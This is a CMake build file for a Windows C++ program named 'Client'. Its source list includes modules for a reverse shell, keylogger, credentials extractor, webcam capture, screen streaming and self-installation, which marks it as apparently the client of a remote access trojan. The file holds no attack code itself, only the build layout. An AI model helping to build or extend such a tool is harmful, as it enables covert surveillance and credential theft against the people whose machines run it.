cmake_minimum_required(VERSION 3.22)
project(Client)

set(CMAKE_CXX_STANDARD 20)
# ---- OPENCV ----
set(OpenCV_DIR "C:\\opencv\\mingw-build\\install")
set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} "${CMAKE_SOURCE_DIR}/cmake/")
find_package(OpenCV REQUIRED)
include_directories(${OpenCV_INCLUDE_DIRS})


set(OpenCV_LIBS opencv_core opencv_imgproc opencv_highgui opencv_imgcodecs)
# ---- OPENCV ----

include_directories(${CMAKE_SOURCE_DIR}/includes)

add_executable(Client
        src/client.cpp
        src/video_audio/DeviceEnumerator.cpp
        src/stream/Stream.cpp
        src/time/TimeCS.cpp
        src/converter/Converter.cpp
        src/download/Download.cpp
        src/file/FileManager.cpp
        src/information/SystemInformation.cpp
        src/information/NetworkInformation.cpp
        src/reverse_shell/ReverseShell.cpp
        src/keylogger/KeyLogger.cpp
        src/keyboard/KeyboardExecuter.cpp
        src/permission/Permission.cpp
        src/box_message/MessageBoxGUI.cpp
        src/state/SystemState.cpp
        src/install/Install.cpp
        src/sender/Sender.cpp
        src/webcam/WebcamManager.cpp
        src/screen/ScreenStreamer.cpp
        src/credentials/CredentialsExtractor.cpp
        includes/CredentialsExtractor.h
        src/connection/ConnectionState.cpp
        includes/ConnectionState.h
)



target_link_libraries(Client
        ${OpenCV_LIBS}
        ws2_32
        wininet
        stdc++fs
        strmiids
        gdiplus
        Crypt32
)
